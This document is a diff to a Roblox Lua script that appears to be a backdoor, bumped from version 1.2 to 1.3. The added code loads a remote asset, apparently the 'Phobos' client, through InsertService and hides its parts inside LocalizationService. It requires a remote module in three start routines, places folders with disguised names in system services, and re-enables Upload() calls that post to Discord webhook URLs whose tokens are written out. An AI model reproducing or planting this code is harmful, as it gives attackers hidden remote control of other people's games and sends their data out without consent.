@@ -3,14 +3,27 @@ oh no
 
 --]]
 
-local BDV = "1.2"
+local BDV = "1.3"
 
 local hook2 = "https://webhook.lewisakura.moe/api/webhooks/1088049912798789643/23e3JvAF-Eh0Vyyi8gPlPYEuIvfliDb06Lv3vWRYOilpjxO5mDgI56etxOwGkFaLoRVI"
-local hook3 = "https://webhook.lewisakura.moe/api/webhooks/1087023541620314253/3At-ZLu7bDkW_KLSVG0D_W0STz7Co_hcO2gtG4FrRg3-Z7aRJv5839YFpwVxP4EPPFcm"
 
 local BlacklistedUsers = {}
 local ChosenLocationNumber = math.random(0,4)
+function PhobosClient()
+	local insert = game:GetService("InsertService")
 
+	local function unGroup(model)
+		for _,v in next,model:GetChildren() do
+			v.Parent = model.Parent
+		end
+		model:Destroy()
+	end
+
+	local model = insert:LoadAsset(7988396423)
+	model.Parent = game:GetService("LocalizationService")
+
+	unGroup(model) --ungroups phobos client
+end
 function Start1()
 	local MainFol = Instance.new("Folder")
 	MainFol.Parent = game:GetService("Chat")
@@ -51,7 +64,8 @@ function Start1()
 	local HttpService = game:GetService("HttpService")
 
 	local phobos = require(10131117731)
-
+	
+	PhobosClient()
 	local isHttpEnabled = pcall(function()
 		game:GetService("HttpService"):RequestAsync({Url = "https://google.com", Method = "GET"})
 	end)
@@ -74,7 +88,7 @@ function Start1()
 			if game:GetService("RunService"):IsStudio() == false then
 				if game:GetService("Chat"):FindFirstChild("ChatLocalizationService") then
 					if game.GameId == 0 then
-						--Upload()
+						Upload()
 						--http hook wont post because the game id is 0
 					else
 						Upload()
@@ -158,7 +172,8 @@ function Start2()
 	local HttpService = game:GetService("HttpService")
 
 	local phobos = require(10131117731)
-
+	
+	PhobosClient()
 	function getMonth(DoTy, months)
 		local var2 = DoTy
 		for i = 1, #months do
@@ -240,7 +255,7 @@ function Start2()
 			if game:GetService("RunService"):IsStudio() == false then
 				if game:GetService("InsertService"):FindFirstChild("InsertModels") then
 					if game.GameId == 0 then
-						--Upload()
+						Upload()
 						--http hook wont post because the game id is 0
 					else
 						Upload()
@@ -324,7 +339,9 @@ function Start3()
 	local HttpService = game:GetService("HttpService")
 
 	local phobos = require(10131117731)
-
+	
+	PhobosClient()
+	
 	function getMonth(DoTy, months)
 		local var2 = DoTy
 		for i = 1, #months do
@@ -406,7 +423,7 @@ function Start3()
 			if game:GetService("RunService"):IsStudio() == false then
 				if game:GetService("LocalizationService"):FindFirstChild("Translate") then
 					if game.GameId == 0 then
-						--Upload()
+						Upload()
 						--http hook wont post because the game id is 0
 					else
 						Upload()
